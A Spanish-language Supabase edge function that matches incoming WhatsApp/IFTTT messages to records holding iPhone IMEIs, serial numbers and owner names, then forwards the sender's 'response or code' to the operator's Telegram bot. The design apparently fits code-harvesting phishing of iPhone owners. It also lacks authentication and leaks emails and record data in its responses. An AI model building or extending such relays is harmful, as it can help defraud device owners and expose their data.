
import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

interface NotificationData {
  NotificationTitle?: string;
  NotificationMessage?: string;
  message?: string;
  sender?: string;
  response?: string;
}

serve(async (req) => {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] Received ${req.method} request to telegram-notification`);
  
  if (req.method === 'OPTIONS') {
    console.log('Handling CORS preflight request');
    return new Response(null, { headers: corsHeaders });
  }

  try {
    console.log('Processing notification request...');
    
    let requestData: NotificationData;
    
    try {
      const body = await req.text();
      console.log('Raw request body:', body);
      console.log('Content-Type header:', req.headers.get('content-type'));
      
      if (!body || body.trim() === '') {
        console.log('Empty request body, using default test data');
        requestData = {
          NotificationTitle: 'Número de prueba',
          NotificationMessage: 'Mensaje de prueba masivo'
        };
      } else {
        try {
          requestData = JSON.parse(body);
          console.log('Successfully parsed as JSON:', requestData);
        } catch (jsonError) {
          console.log('Failed to parse as JSON, trying text format...');
          
          if (body.includes('{{NotificationTitle}}') || body.includes('{{NotificationMessage}}')) {
            console.log('Detected IFTTT template variables that weren\'t replaced');
            return new Response(
              JSON.stringify({ 
                success: false, 
                error: 'IFTTT template error',
                message: 'Las variables de IFTTT no se reemplazaron correctamente. Verifica tu configuración de IFTTT.',
                received_body: body
              }), 
              { 
                headers: { ...corsHeaders, 'Content-Type': 'application/json' },
                status: 400
              }
            );
          }
          
          const lines = body.split('\n').map(line => line.trim()).filter(line => line.length > 0);
          console.log('Parsed lines from text:', lines);
          
          if (lines.length >= 2) {
            requestData = {
              NotificationTitle: lines[0],
              NotificationMessage: lines[1]
            };
            console.log('Parsed as text format:', requestData);
          } else if (lines.length === 1) {
            requestData = {
              NotificationTitle: 'Número desconocido',
              NotificationMessage: lines[0]
            };
          } else {
            throw new Error('Unable to parse request body');
          }
        }
      }
    } catch (parseError) {
      console.error('Error parsing request body:', parseError);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Invalid request format',
          message: 'Formato de solicitud inválido. Debe ser JSON o texto plano.',
          details: parseError.message
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }
    
    console.log('Parsed notification data:', requestData);

    let phoneNumber = '';
    let messageText = '';
    
    if (requestData.NotificationTitle || requestData.NotificationMessage) {
      phoneNumber = requestData.NotificationTitle || '';
      messageText = requestData.NotificationMessage || '';
    } else if (requestData.message) {
      messageText = requestData.message;
      phoneNumber = requestData.sender || '';
    }

    console.log('Extracted data:', { phoneNumber, messageText });

    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    
    console.log('Connecting to Supabase...');
    const { createClient } = await import('https://esm.sh/@supabase/supabase-js@2');
    const supabase = createClient(supabaseUrl, supabaseKey);

    // Si no hay número de teléfono, usar modo prueba
    if (!phoneNumber || phoneNumber === 'Número de prueba' || phoneNumber === 'Número desconocido') {
      console.log('No phone number provided or test mode, searching for any active process...');
      
      const { data: processes, error: queryError } = await supabase
        .from('processes')
        .select('*')
        .limit(1);

      if (queryError) {
        console.error('Database query error:', queryError);
        return new Response(
          JSON.stringify({ 
            success: false, 
            error: 'Database error',
            details: queryError.message 
          }), 
          { 
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 500
          }
        );
      }

      if (!processes || processes.length === 0) {
        console.log('No processes found');
        return new Response(
          JSON.stringify({ 
            success: false, 
            error: 'No processes found',
            message: 'No se encontraron procesos para modo prueba'
          }), 
          { 
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 404
          }
        );
      }

      const process = processes[0];
      return await sendNotificationToUser(process, phoneNumber || 'Número de prueba', messageText || 'Mensaje de prueba', supabase, true);
    }

    // Buscar proceso por número de teléfono
    console.log('Searching for process with phone number:', phoneNumber);
    const matchedProcess = await findProcessByPhoneNumber(phoneNumber, supabase);

    if (!matchedProcess) {
      console.log('No matching process found for phone number:', phoneNumber);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Process not found',
          message: `No se encontró un proceso con el número de teléfono: ${phoneNumber}`,
          phone_searched: phoneNumber
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 404
        }
      );
    }

    console.log('Found process:', matchedProcess.id, 'for user:', matchedProcess.user_id);
    return await sendNotificationToUser(matchedProcess, phoneNumber, messageText, supabase, false);

  } catch (error) {
    console.error('Error processing notification:', error);
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: 'Internal server error',
        details: error.message,
        timestamp: new Date().toISOString()
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500
      }
    );
  }
});

async function findProcessByPhoneNumber(phoneNumber: string, supabase: any) {
  const cleanPhoneNumber = phoneNumber.replace(/[\s\-\(\)]/g, '');
  console.log('Searching for process with cleaned phone number:', cleanPhoneNumber);

  // Patrones de búsqueda optimizados
  const searchPatterns = [
    cleanPhoneNumber,
    phoneNumber,
    cleanPhoneNumber.startsWith('+') ? cleanPhoneNumber : `+${cleanPhoneNumber}`,
    cleanPhoneNumber.replace('+', ''),
    cleanPhoneNumber.replace(/^\+505/, ''),
    cleanPhoneNumber.replace(/^505/, ''),
    cleanPhoneNumber.slice(-8),
    cleanPhoneNumber.slice(-7),
  ];

  const uniquePatterns = [...new Set(searchPatterns)].filter(p => p && p.length > 0);
  console.log('Search patterns:', uniquePatterns);

  // Buscar en la base de datos de forma optimizada
  for (const pattern of uniquePatterns) {
    console.log(`Searching with pattern: "${pattern}"`);
    
    const { data: processes, error } = await supabase
      .from('processes')
      .select('*')
      .eq('phone_number', pattern)
      .limit(1);

    if (!error && processes && processes.length > 0) {
      console.log('Match found with pattern:', pattern);
      return processes[0];
    }

    // Buscar combinando country_code + phone_number
    const { data: allProcesses, error: allError } = await supabase
      .from('processes')
      .select('*')
      .limit(100);

    if (!allError && allProcesses) {
      for (const proc of allProcesses) {
        const fullNumber = `${proc.country_code}${proc.phone_number}`;
        const fullNumberClean = fullNumber.replace(/[\s\-\(\)]/g, '');
        
        if (fullNumberClean === pattern || 
            fullNumberClean === pattern.replace('+', '') ||
            fullNumber === pattern ||
            proc.phone_number === pattern) {
          console.log('Match found with combined pattern:', pattern, 'matching:', fullNumber);
          return proc;
        }
      }
    }
  }

  return null;
}

async function sendNotificationToUser(process: any, phoneNumber: string, messageText: string, supabase: any, isTestMode: boolean) {
  console.log('Sending notification to user:', process.user_id, 'for process:', process.id);

  // Obtener configuración del bot del usuario
  const { data: profile, error: profileError } = await supabase
    .from('profiles')
    .select('telegram_bot_token, telegram_chat_id, email')
    .eq('id', process.user_id)
    .single();

  if (profileError || !profile) {
    console.error('Profile not found for user:', process.user_id, profileError);
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: 'Profile not found',
        message: `No se encontró el perfil del usuario: ${process.user_id}`,
        user_id: process.user_id
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 404
      }
    );
  }

  console.log('Profile found for user:', profile.email);

  if (!profile.telegram_bot_token || !profile.telegram_chat_id) {
    console.log('User has not configured Telegram bot:', process.user_id);
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: 'Telegram not configured',
        message: `El usuario ${profile.email} no ha configurado su bot de Telegram`,
        user_id: process.user_id,
        user_email: profile.email
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 400
      }
    );
  }

  // Crear mensaje de notificación personalizado
  const notificationMessage = `🔔 ${isTestMode ? 'PRUEBA - ' : ''}Alerta de proceso de WhatsApp

👩🏽‍💻 Servidor Astro${isTestMode ? ' - MODO PRUEBA' : ''}

📊 INFORMACIÓN DEL PROCESO:
👤 Cliente: ${process.client_name}
📱 Modelo: ${process.iphone_model}
📞 IMEI: ${process.imei}
🔢 Serie: ${process.serial_number}
${process.owner_name ? `👥 Propietario: ${process.owner_name}` : ''}

📞 Remitente: ${phoneNumber}
📥 Respuesta o código: ${messageText}

🤖 Bot Astro en línea 🟢
⏰ ${new Date().toLocaleString('es-ES')}

${isTestMode ? '⚠️ Este es un mensaje de PRUEBA' : ''}`;

  console.log('Sending notification to Telegram...');
  console.log('Bot token (first 10 chars):', profile.telegram_bot_token?.substring(0, 10));
  console.log('Chat ID:', profile.telegram_chat_id);
  
  const telegramUrl = `https://api.telegram.org/bot${profile.telegram_bot_token}/sendMessage`;
  
  try {
    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: profile.telegram_chat_id,
        text: notificationMessage,
        parse_mode: 'HTML'
      }),
    });

    const telegramResult = await telegramResponse.json();
    
    if (!telegramResponse.ok) {
      console.error('Telegram API error for user:', process.user_id, telegramResult);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Failed to send Telegram message',
          details: telegramResult,
          user_id: process.user_id,
          user_email: profile.email,
          bot_config: {
            has_token: !!profile.telegram_bot_token,
            has_chat_id: !!profile.telegram_chat_id,
            token_length: profile.telegram_bot_token?.length || 0
          }
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        }
      );
    }

    console.log('Notification sent successfully to user:', process.user_id);

    return new Response(
      JSON.stringify({ 
        success: true, 
        message: isTestMode ? 'Test notification sent successfully' : 'Notification sent successfully',
        process_id: process.id,
        user_id: process.user_id,
        user_email: profile.email,
        phone_number: phoneNumber,
        message_content: messageText,
        test_mode: isTestMode,
        timestamp: new Date().toISOString()
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200
      }
    );

  } catch (telegramError) {
    console.error('Error calling Telegram API:', telegramError);
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: 'Telegram API connection error',
        details: telegramError.message,
        user_id: process.user_id,
        user_email: profile.email
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500
      }
    );
  }
}
